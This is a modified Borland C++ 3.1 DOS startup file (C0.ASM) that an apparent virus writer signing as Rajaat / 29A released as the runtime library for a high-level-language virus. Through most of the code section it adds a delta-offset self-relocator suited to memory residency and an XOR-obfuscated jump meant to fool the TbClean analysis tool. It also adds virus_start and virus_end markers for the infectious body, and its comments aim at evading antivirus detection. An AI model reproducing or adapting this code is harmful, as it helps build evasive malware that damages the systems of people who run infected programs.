   ;[]------------------------------------------------------------[]
   ;|      C0.ASM -- Start Up Code for DOS                         |
   ;[]------------------------------------------------------------[]
   ;
   ;       C/C++ Run Time Library - Version 5.0
   ;
   ;       Copyright (c) 1987, 1992 by Borland International
   ;       All Rights Reserved.
   ;
   ;=====( Modifications by Rajaat / 29A )========================================
   ;
   ; I had to make some alterations to the startupcode of Borland C++ 3.1 in order
   ; to make my code work. I could not avoid this due to the design of the main
   ; code. If I would wanted to leave this part untouched I would have written a
   ; prepender.
   ;
   ; I also removed some useless code, like the Borland copyright notice (since I
   ; think the av will undoubtly recognize this one as a HLL virus, they
   ; unfortunately missed it that Animo.518 also was a HLL virus), the
   ; checksumming code, the code that you can insert more startup code using the
   ; #pragma startup in the source, BIOS time in ticks, midnight time flag and
   ; some other things. Also I had to insert a call to the __setupio() code.
   ;
   ; Anyway, this file is a quick hack of the original code and may or may not be
   ; bug free or completely optimized, but since it is needed by the rest of the
   ; code I'll release it nonetheless.
   ;
   ; For instructions how to compile this, check the main C source,
   ; NICKFITZ.C
   ;
   ;==============================================================================

                   locals

                   __C0__ = 1
   INCLUDE         RULES.ASI

   ;       Segment and Group declarations

   _TEXT           SEGMENT BYTE PUBLIC 'CODE'
                   ENDS
   _FARDATA        SEGMENT PARA PUBLIC 'FAR_DATA'
                   ENDS
   _FARBSS         SEGMENT PARA PUBLIC 'FAR_BSS'
                   ENDS
   _DATA           SEGMENT PARA PUBLIC 'DATA'
                   ENDS
   _INIT_          SEGMENT WORD PUBLIC 'INITDATA'
   InitStart       label byte
                   ENDS
   _INITEND_       SEGMENT BYTE PUBLIC 'INITDATA'
   InitEnd         label byte
                   ENDS
   _EXIT_          SEGMENT WORD PUBLIC 'EXITDATA'
   ExitStart       label byte
                   ENDS
   _EXITEND_       SEGMENT BYTE PUBLIC 'EXITDATA'
   ExitEnd         label byte
                   ENDS
   _CVTSEG         SEGMENT WORD PUBLIC 'DATA'
                   ENDS
   _SCNSEG         SEGMENT WORD PUBLIC 'DATA'
                   ENDS
   IFNDEF __HUGE__
     _BSS          SEGMENT WORD PUBLIC 'BSS'
                   ENDS
     _BSSEND       SEGMENT BYTE PUBLIC 'BSSEND'
                   ENDS
   ENDIF

           ASSUME  CS:_TEXT, DS:DGROUP

   ;       External References

   extrn       _main:DIST
   extrn       __exit:DIST
   extrn       __nfile:word
   extrn       __setupio:near          ;required!
   extrn       __stklen:word
   IF LDATA  EQ  false
   extrn       __heaplen:word
   ENDIF

           SUBTTL  Start Up Code
           PAGE
   ;/*                                                     */
   ;/*-----------------------------------------------------*/
   ;/*                                                     */
   ;/*     Start Up Code                                   */
   ;/*     -------------                                   */
   ;/*                                                     */
   ;/*-----------------------------------------------------*/
   ;/*                                                     */
   PSPHigh         equ     00002h
   PSPEnv          equ     0002ch
   PSPCmd          equ     00080h

                   public  __AHINCR
                   public  __AHSHIFT
                   public  _DSEG

                   public  _exit
                   public  _abort

                   public  __terminate
                   public  __checknull
                   public  __restorezero
                   public  __cleanup

   __AHINCR        equ     1000h
   __AHSHIFT       equ     12

   ;
   ;       At the start, DS and ES both point to the segment prefix.
   ;       SS points to the stack segment except in TINY model where
   ;       SS is equal to CS
   ;
   _TEXT           SEGMENT
                   ORG     100h
   STARTX          PROC    NEAR
   ;       Save general information, such as :
   ;               DGROUP segment address
   ;               DOS version number
   ;               Program Segment Prefix address
   ;               Environment address
   ;               Top of far heap

   PubSym@         virus_start,    <label byte>,   __CDECL__

                   call get_offset                 ; get delta offset for the
   get_offset:     pop bx                          ; relocator.
                   mov si,bx                       ;
                   sub si,offset get_offset        ;

                   mov word ptr cs:_pspseg[si],ds  ; store PSP for C code
                   or si,si                        ; no delta offset?
                   jz no_fixup                     ; indeed, no alignment needed
                                                   ; jump to no_fixup

                   lea si,_virus_start[si]         ; this part relocates the whole
                   lea di,_virus_end               ; code so that it gets aligned
                   push ds                         ; at a paragraph. this gets
                   push cs                         ; calculated in such way that
                   pop ds                          ; whereever the code may reside
                   dec bh                          ; it always is located at
                   mov cl,4                        ; CS:100h, just like the
                   shr bx,cl                       ; compiled original. this also
                   mov ax,cs                       ; makes it ideal for memory
                   add bx,ax                       ; residency.
                   add bx,10                       ;
                   mov es,bx                       ;
                   lea cx,_virus_end-100h          ;
                   add si,cx                       ;
                   std                             ; we move in backwards fashion
                   rep movsb                       ; to prevent overwriting our
                   movsb                           ; own code
                   pop ds                          ;

                   push bx                         ; we now jump back to the
                   mov ax,100h xor 0deadh          ; relocated relocator (wow!
                   xor ax,0deadh                   ; did we jump to the original
                   push ax                         ; program, tbclean?) which
                   retf                            ; sees that we are aligned and
                                                   ; will eventually end at
                                                   ; no_fixup

   no_fixup:       push cs                         ; i clean some segments here,
                   push cs                         ; C would probably require it
                   push cs                         ;
                   pop ds                          ;
                   pop es                          ;
                   pop ss                          ;
                   mov ax,word ptr cs:_pspseg      ;

   ;=====( Comments from Rajaat )=================================================
   ; From here on I've cutted out some Borland code, but I left their comments in.
   ; Excuse me if it looks a bit confusing, but it's just a stripped version of
   ; the normal Borland C++ 3.1 startup code.
   ;==============================================================================

                   mov     _psp@, ax       ; Keep Program Segment Prefix address
                   push    ax
                   pop     ds

                   mov     dx, cs          ; DX = GROUP Segment address
                   mov     cs:DGROUP@@, dx ;  __BOSS__
                   mov     ah, 30h
                   int     21h             ; get DOS version number
                   mov     bp, ds:[PSPHigh]; BP = Highest Memory Segment Addr
                   mov     bx, ds:[PSPEnv] ; BX = Environment Segment address
                   mov     ds, dx
                   mov     _version@, ax   ; Keep major and minor version number
                   mov     _envseg@, bx    ; Keep Environment Segment address
                   mov     word ptr _heaptop@ + 2, bp

   ;       Count the number of environment variables and compute the size.
   ;       Each variable is ended by a 0 and a zero-length variable stops
   ;       the environment. The environment can NOT be greater than 32k.

                   mov     ax, _envseg@
                   mov     es, ax
                   xor     ax, ax
                   mov     bx, ax
                   mov     di, ax

                   mov     cx, 07FFFh      ; Environment cannot be > 32 Kbytes
                   cld
   @@EnvLoop:
                   repnz   scasb
                   jcxz    InitFailed      ; Bad environment !!!

                   inc     bx              ; BX = Nb environment variables
                   cmp     es:[di], al
                   jne     @@EnvLoop       ; Next variable ...
                   or      ch, 10000000b
                   neg     cx
                   mov     _envLng@, cx    ; Save Environment size
                   mov     cx, dPtrSize / 2
                   shl     bx, cl
                   add     bx, dPtrSize * 4
                   and     bx, not ((dPtrSize * 4) - 1)
                   mov     _envSize@, bx   ; Save Environment Variables Nb.

   ;       Reset uninitialized data area

                   xor     ax, ax
                   mov     es, cs:DGROUP@@
                   mov     di, offset DGROUP: bdata@
                   mov     cx, offset DGROUP: edata@
                   sub     cx, di
                   cld
                   rep     stosb

   ;   If default number of file handles have changed then tell DOS

   ;       Prepare main arguments

   ;=====( I commented this out, if you really want it just remove the comments )=
   ;               mov     ah, 0
   ;               int     1ah                     ; get current BIOS time in ticks
   ;               mov     word ptr _StartTime@,dx ; save it for clock() fn
   ;               mov     word ptr _StartTime@+2,cx
   ;               or      al,al                   ; was midnight flag set?
   ;               jz      @@NotMidnight
   ;               mov     ax,40h                  ; set BIOS midnight flag
   ;               mov     es,ax                   ;  at 40:70
   ;               mov     bx,70h
   ;               mov     byte ptr es:[bx],1

   @@NotMidnight:
                   xor     bp,bp                   ; set BP to 0 for overlay mgr

                   mov     es, cs:DGROUP@@

   ;       ExitCode = main(argc,argv,envp);

                   call __setupio                  ;===( Done manually! )=========

   IF      LDATA
                   push    word ptr __C0environ+2
                   push    word ptr __C0environ
                   push    word ptr __C0argv+2
                   push    word ptr __C0argv
   ELSE
                   push    word ptr __C0environ
                   push    word ptr __C0argv
   ENDIF
                   push    __C0argc
                   call    _main

   ;       Flush and close streams and files
   _exit:
   _abort:
   InitFailed:
                   mov bx,word ptr cs:_pspseg
                   mov es,bx
                   mov ds,bx
                   mov ss,bx
                   mov ax,4c00h
                   int 21h

   __terminate:
   __checknull:
   __restorezero:
   __cleanup:      ret


   ;---------------------------------------------------------------------------
   ;       _cleanup()      call all #pragma exit cleanup routines.
   ;       _checknull()    check for null pointer zapping copyright message
   ;       _terminate(int) exit program with error code
   ;
   ;       These functions are called by exit(), _exit(), _cexit(),
   ;       and _c_exit().
   ;---------------------------------------------------------------------------

   STARTX          ENDP

           SUBTTL  Vector save/restore & default Zero divide routines
           PAGE
   ;------------------------------------------------------------------

   ; The DGROUP@ variable is used to reload DS with DGROUP

   _DSEG           equ $
   PubSym@         DGROUP@, <dw    ?>, __PASCAL__

   ; __MMODEL is used to determine the memory model or the default
   ; pointer types at run time.

                   public __MMODEL
   __MMODEL        dw      MMODEL

   _TEXT           ENDS

                   SUBTTL  Start Up Data Area
                   PAGE
   ;[]------------------------------------------------------------[]
   ;|      Start Up Data Area                                      |
   ;|                                                              |
   ;|      WARNING         Do not move any variables in the data   |
   ;|                      segment unless you're absolutely sure   |
   ;|                      that it does not matter.                |
   ;[]------------------------------------------------------------[]

   _DATA           SEGMENT

   ;       Magic symbol used by the debug info to locate the data segment
                   public DATASEG@
   DATASEG@        label   byte

   ;
   ;                       Miscellaneous variables
   ;
   PubSym@         _C0argc,        <dw     0>,             __CDECL__
   dPtrPub@        _C0argv,        0,                      __CDECL__
   dPtrPub@        _C0environ,     0,                      __CDECL__
   PubSym@         _envLng,        <dw     0>,             __CDECL__
   PubSym@         _envseg,        <dw     0>,             __CDECL__
   PubSym@         _envSize,       <dw     0>,             __CDECL__
   PubSym@         _psp,           <dw     0>,             __CDECL__
   PubSym@         _version,       <label word>,           __CDECL__
   PubSym@         _osversion,     <label word>,           __CDECL__
   PubSym@         _osmajor,       <db     0>,             __CDECL__
   PubSym@         _osminor,       <db     0>,             __CDECL__
   PubSym@         errno,          <dw     0>,             __CDECL__
   PubSym@         _StartTime,     <dw   0,0>,             __CDECL__



   ;       Memory management variables

   IF      LDATA  EQ  false
   PubSym@         __heapbase,     <dw   DGROUP:edata@>,   __CDECL__
   ENDIF
   IFNDEF __HUGE__
   PubSym@         __brklvl,       <dw   DGROUP:edata@>,   __CDECL__
   ENDIF
   PubSym@         _heapbase,      <dd   0>,       __CDECL__
   PubSym@         _brklvl,        <dd   0>,       __CDECL__
   PubSym@         _heaptop,       <dd   0>,       __CDECL__
   PubSym@         pspseg          <dw   0>,       __CDECL__

   _DATA           ENDS

   _CVTSEG         SEGMENT
   PubSym@         _RealCvtVector, <label  word>,  __CDECL__
                   ENDS

   _SCNSEG         SEGMENT
   PubSym@         _ScanTodVector,  <label word>,  __CDECL__
                   ENDS

   IFNDEF __HUGE__
   _BSS            SEGMENT

   ;=====( Sorry, I could not resist putting my name in it )======================

   Signature       db '[ VX-CLib 1.0 by Rajaat / 29A ]',0

   bdata@          label   byte

   ;=====( This might come in handy ;-)===========================================

   PubSym@         virus_end,      <label byte>,   __CDECL__
                   ENDS

   _BSSEND         SEGMENT
   edata@          label   byte
                   ENDS
   ENDIF

                   END     STARTX
